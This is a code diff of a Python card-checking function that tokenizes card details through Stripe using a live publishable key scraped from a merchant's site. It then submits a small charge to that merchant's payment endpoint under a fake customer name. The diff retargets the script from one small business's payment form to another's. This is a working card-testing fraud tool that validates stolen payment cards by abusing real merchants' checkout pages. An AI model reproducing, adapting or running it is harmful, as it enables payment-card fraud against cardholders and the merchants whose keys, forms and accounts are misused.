@@ -26,27 +26,25 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F6998fecf74%3B+stripe-js-v3%2F6998fecf74%3B+card-element&key=pk_live_51QOSGsBSdD240uQEHRbI1Uoe2VKOKidFPq0TQfyr1SPXwD7CyZkMDsO4t7M0IzB584DJlx4ze75fYe96AYJxxu4S00rEgTnmeR'
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b&muid=9c9bd691-52f6-4a7b-8a50-289183b34315dfbac4&sid=c32d96c6-e51a-42c8-96fe-9b5c043ee78645a841&pasted_fields=number&payment_user_agent=stripe.js%2F5ea0d5a7b4%3B+stripe-js-v3%2F5ea0d5a7b4%3B+card-element&referrer=https%3A%2F%2Fwww.americanattorneyserv.com&time_on_page=47485&key=pk_live_51QYLMODttiJ9OxYfTQDn42GZgW2OWnnySOlZpeW07KtCFbyk7FTlUUomu1OaymNXcTtcIqqNBflowkACDRogfvpz00SXHoXM0A'
 	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
 	
 	pm = r1.json()['id']
 	
 	cookies = {
-	    '_ga': 'GA1.1.1597466595.1740096794',
-	    '__stripe_mid': 'fa860ab2-0e78-4a8e-b532-26acdba570ab427469',
-	    '__stripe_sid': '163d3db2-5634-43db-9d7e-1f93b4020a1b6c5307',
-	    '_ga_WCQ2FKT7F4': 'GS1.1.1740096793.1.1.1740096896.0.0.0',
+	    '__stripe_mid': '9c9bd691-52f6-4a7b-8a50-289183b34315dfbac4',
+	    '__stripe_sid': 'c32d96c6-e51a-42c8-96fe-9b5c043ee78645a841',
 	}
 	
 	headers = {
-	    'authority': 'tucsonmarketingdirect.com',
+	    'authority': 'www.americanattorneyserv.com',
 	    'accept': '*/*',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    # 'cookie': '_ga=GA1.1.1597466595.1740096794; __stripe_mid=fa860ab2-0e78-4a8e-b532-26acdba570ab427469; __stripe_sid=163d3db2-5634-43db-9d7e-1f93b4020a1b6c5307; _ga_WCQ2FKT7F4=GS1.1.1740096793.1.1.1740096896.0.0.0',
-	    'origin': 'https://tucsonmarketingdirect.com',
-	    'referer': 'https://tucsonmarketingdirect.com/make-a-payment/',
+	    # 'cookie': '__stripe_mid=9c9bd691-52f6-4a7b-8a50-289183b34315dfbac4; __stripe_sid=c32d96c6-e51a-42c8-96fe-9b5c043ee78645a841',
+	    'origin': 'https://www.americanattorneyserv.com',
+	    'referer': 'https://www.americanattorneyserv.com/paynow.php',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -58,14 +56,11 @@ def Tele(ccx):
 	}
 	
 	data = {
-	    'action': 'wpf_submit_form',
-	    'form_id': '1763',
-	    'payment_total': '100',
-	    'form_data': '__wpf_form_id=1763&__wpf_current_url=https%3A%2F%2Ftucsonmarketingdirect.com%2Fmake-a-payment&__wpf_current_page_id=1688&customer_name_1=Rodam%20User&customer_email_1=rodamuser20%40gmail.com&address_input%5Baddress_line_1%5D=Street%2027&address_input%5Baddress_line_2%5D=&address_input%5Bcity%5D=New%20York&address_input%5Bstate%5D=New%20York&address_input%5Bzip_code%5D=10080&address_input%5Bcountry%5D=US&custom_payment_input=1&__stripe_payment_method_id='+str(pm)+'',
-	    'tax_total': '0',
-	    'main_total': '100',
+	    'token': pm,
+	    'amount': '1',
+	    'name': 'Rodam User',
 	}
 	
-	r2 = requests.post('https://tucsonmarketingdirect.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+	r2 = requests.post('https://www.americanattorneyserv.com/payment.php', cookies=cookies, headers=headers, data=data)
 	
 	return (r2.json())
